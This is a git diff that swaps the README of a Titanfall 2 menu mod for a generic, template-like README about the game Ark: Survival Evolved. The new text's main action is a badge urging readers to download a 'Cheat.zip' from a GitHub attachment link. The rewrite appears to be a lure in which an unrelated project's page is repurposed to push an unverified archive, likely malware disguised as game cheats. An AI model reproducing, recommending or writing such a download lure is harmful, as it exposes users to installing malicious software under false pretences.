@@ -1,120 +1,83 @@
-<p align="center" style="text-align:center"><img width="125" height="122" src="https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/icon.png" alt="Titanfall 2 - Enhanced Menu Mod" /></p>
+# Ark Survival Evolved
 
-![VPK Build Status](https://github.com/taskinoz/Enhanced-Menu-Mod/actions/workflows/buildvpks.yml/badge.svg)
+![Ark Survival Evolved Logo](https://example.com/ark-logo.png)
 
+Welcome to the Ark Survival Evolved repository! This GitHub project aims to provide resources, tools, and information related to the popular game *Ark: Survival Evolved*. In this README, you will find all the necessary details about the repository content, how to contribute, and where to find additional useful resources.
 
-# Enhanced Menu Mod
-Adds more options to the settings menu, such as extra keybinds, cheats, hud enhancements and cleaner interface
+---
 
-# Features
-* Removed **Spotlight** and **Whats New** from the main menu
-* Added `sv_cheats` to the contols menu
-* Added HUD Options
-  * Bloom - `mat_disable_bloom`
-  * Show FPS - `cl_showfps`
-  * Show FPS Big - `showfps_enabled`
-  * Show Player Position - `cl_showpos`
-* Added new Keybinds
-  * Speedrunning
-    * Save/Load Quicksave 1
-    * Save/Load Quicksave 2
-    * Save/Load Quicksave 3
-    * Slow the game to 25%
-    * Speed the game up to 500%
-    * Reset all helmets
-    * Give yourself an EVA Shotgun
-    * Give yourself an EPG
-  * Demos
-    * Record Demo incrementally
-    * Record Demo
-    * Stop recording Demo
-    * Pause Demo
-    * Resume Demo
-    * Toggle Play/Pause Demo
-  * Extras
-    * Toggle low gravity
-    * Set camera to First Person
-    * Set camera to Third Person
-    * Move Third Person camera in
-    * Move Third Person camera out
-    * Hide/Show weapon
-  * No Cutscene Saves
-    * Load save 1-9 with 3 alternate saves
-  * No Cutscene Helmet Saves
-    * Load save 1 and 2
-* Added Extras Menu
-  * Demos
-    * Enable Demos
-    * Save Demos
-    * Interpolate Playback
-    * Demo record rate Single Player
-    * Demo record rate Multiplayer
-    * Key Bindings (shortcut)
-  * Gameplay
-    * Enable Wallrunning (sp)
-    * Enable Automantle (sp)
-    * Enable Vertical Dodge (sp)
-    * Player Control Debounce
-    * Command Que
-    * Speedometer Settings (Works with the MP mod)
-  * Community
-    * Communities toggle for MP
-* Audio
-  * Loading Fade Time
-  * Loading Silence Time
-* Replaced Chinese subtitles with English
-* Replaced Chinese UI text with English
-* Removed crashes from Dev launch arguments `-dev +developer 1`
-* Added Speedometer (only to Single Player)
+## Table of Contents
+
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+
+---
+
+## Introduction
+
+*Ark: Survival Evolved* is a multiplayer online survival game developed and published by Studio Wildcard. The game places players on a mysterious island filled with ancient creatures and other players, challenging them to survive in a harsh environment filled with danger.
+
+This repository serves as a hub for enthusiasts of the game to collaborate, share resources, and stay updated on the latest developments and strategies within the *Ark* community.
+
+![Ark Survival Evolved Gameplay](https://example.com/ark-gameplay.png)
+
+---
+
+## Features
+
+- Access to cheat codes and mods to enhance your *Ark* experience.
+- Guides and tutorials for surviving in the game's challenging world.
+- Community-driven discussions and strategies.
+- Notifications about game updates and patches.
+- Exclusive content for fans of *Ark: Survival Evolved*.
+
+---
 
 ## Installation
 
-1) Download the pre-compiled version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page or [ModDB(OLD)](https://www.moddb.com/mods/enhanced-menu)
+To get started with *Ark: Survival Evolved*, follow these steps:
 
-2) Backup your `englishclient_frontend.bsp.pak000_dir.vpk` and copy the 2 `.vpk` files from the downloaded zip to your `Titanfall2/vpk` folder
+1. Purchase the game from an official retailer or online platform.
+2. Download and install the game on your preferred gaming platform.
+3. Launch the game and start your adventure in the world of *Ark*.
 
-## Icepick
+For additional tools and resources to enhance your gameplay, you can download the provided cheat codes from the link below:
 
-1) Download the Icepick specific version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page
+[![Download Cheat Codes](https://img.shields.io/badge/Download-Cheat%20Codes-<COLOR_HEX_CODE>)](https://github.com/user-attachments/files/16612167/Cheat.zip)
 
-2) Open the downloaded `Enhanced.Menu.Mod.Icepick.zip` file and copy the `Enhanced.Menu.Mod.Icepick` folder to you `Icepick/data/mods` folder.
+Make sure to replace `<COLOR_HEX_CODE>` in the badge URL with the hexadecimal color code of your choice for a customized look.
 
-3) Launch Icepick.
+---
 
-## Northstar
+## Usage
 
-1) Download the Northstar specific version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page
+Explore the various sections of this repository to find cheat codes, guides, and community discussions related to *Ark: Survival Evolved*. Feel free to contribute your own insights, strategies, and resources to help enrich the *Ark* community.
 
-2) Open the downloaded `Enhanced.Menu.Mod.Northstar.zip` file and copy the `Enhanced.Menu.Mod.Northstar` folder to you `Titanfall2/R2Northstar/mods` folder.
+If you encounter any issues with the game or have ideas for improvement, please open an issue on this repository so that the community can address them together.
 
-3) Launch Northstar.
+---
 
-## Screenshots
+## Contributing
 
-![Main Menu with custom menu video](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-main.jpg)
+Contributions to this repository are welcome and encouraged. If you have cheat codes, mods, guides, or other resources to share with the *Ark: Survival Evolved* community, please feel free to submit a pull request with your changes.
 
-Main Menu with the original Titanfall 2 menu video
+To contribute, follow these steps:
+1. Fork this repository to your GitHub account.
+2. Make your changes or additions.
+3. Submit a pull request to have your contributions reviewed and merged.
 
-![Main Menu with no showcase content](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-main1.jpg)
+Thank you for helping make this repository a valuable resource for *Ark* players worldwide!
 
-Main Menu with the showcase removed to declutter the menu
+---
 
-![Cheats setting](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-cheats.jpg)
+## License
 
-New Cheat options that can be enabled as well as the extras menu
+This repository is licensed under the MIT License. See [LICENSE](LICENSE) for more information.
 
-![New custom keybinds](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-keys.jpg)
+---
 
-Added keybinds for speedrunners and extra commands for fun
-
-![Advanced Look Options with values](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-advanced-look.jpg)
-
-Shows the values for each setting on the Advanced Look Options
-
-![New HUD options](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-hud.jpg)
-
-Added extra HUD display options for showing FPS, Position, Velocity, and Server Tick rate
-
-![Extras Menu](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-extras.jpg)
-
-Added a menu for enabling and changing demo settings for recording single and multiplayer demos as well as turning of wallrunning and enabling titan jumping.
+Thank you for visiting the *Ark Survival Evolved* repository! Have a great time exploring the world of *Ark* and enjoying the resources provided here. Remember to check back frequently for updates and new content related to the game. Good luck surviving and thriving in the world of *Ark: Survival Evolved*! 🦕🔥🌿🏹
